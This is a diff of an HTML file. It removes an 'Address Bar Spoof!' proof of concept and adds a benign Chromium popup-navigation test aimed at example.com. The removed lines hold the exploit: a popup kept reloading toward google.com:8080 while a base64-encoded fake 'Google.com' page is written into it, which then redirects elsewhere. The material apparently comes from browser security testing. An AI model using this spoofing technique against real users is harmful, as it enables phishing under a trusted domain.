@@ -1,16 +1,33 @@
+<!DOCTYPE html>
 <html>
-    <head>
-        <title>Address Bar Spoof!</title>
-    </head>
-    <body>
-        <script>
-            function demo() {
-            var evilPage = 'PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdvb2dsZS5jb208L3RpdGxlPgo8L2hlYWQ+Cgo8Ym9keT4KCjxoMSBpZD0ibXNnIj53YWl0PC9oMT4KPGRpdiBpZD0iYXJlYSI+PC9kaXY+Cgo8c2NyaXB0PgoKLy8gc2V0ZWxhaCA1IGRldGlrIG11bmN1bGthbiB0b21ib2wKc2V0VGltZW91dChmdW5jdGlvbigpewoKICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYXJlYSIpLmlubmVySFRNTCA9CiAgICAnPGEgaHJlZj0iIyIgaWQ9ImdidG4iPmNsaWNrIG1lIHRvIGdvb2dsZS5jb208L2E+JzsKCiAgLy8gc2FhdCBkaWtsaWsgZ2FudGkgdGVrcyBsYWx1IHJlZGlyZWN0IHBha2FpIG1ldGEgcmVmcmVzaAogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJnYnRuIikub25jbGljayA9IGZ1bmN0aW9uKGUpewoKICAgIGUucHJldmVudERlZmF1bHQoKTsKCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibXNnIikuaW5uZXJIVE1MID0gIm5vdCBnb29nbGUgYnJvIjsKCiAgICB2YXIgbWV0YSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm1ldGEiKTsKICAgIG1ldGEuaHR0cEVxdWl2ID0gInJlZnJlc2giOwogICAgbWV0YS5jb250ZW50ID0gIjA7dXJsPWh0dHA6Ly9hY2Nlc3MuYXBwbGUuY29tLyI7CgogICAgZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChtZXRhKTsKCiAgfTsKCn0sIDUwMDApOwoKPC9zY3JpcHQ+Cgo8L2JvZHk+CjwvaHRtbD4=';
-                var x = window.open('','');
-                setInterval(function(){x.location.replace('https://www.google.com:8080');});
-                x.document.write(atob(evilPage));
-            }
-        </script>
-        <button onclick="demo();">test</button>
-    </body>
+<body>
+
+<h1 id="msg">Chromium navigation test</h1>
+<button id="run">run test</button>
+
+<script>
+
+document.getElementById("run").onclick = async function(){
+
+    document.getElementById("msg").innerText = "opening popup";
+
+    let popup = window.open("about:blank");
+
+    await new Promise(r => setTimeout(r, 100));
+
+    document.getElementById("msg").innerText = "navigating popup";
+
+    popup.location.assign("https://example.com");
+
+    await new Promise(r => setTimeout(r, 100));
+
+    document.getElementById("msg").innerText = "navigating main page";
+
+    location.assign("https://example.com");
+
+};
+
+</script>
+
+</body>
 </html>
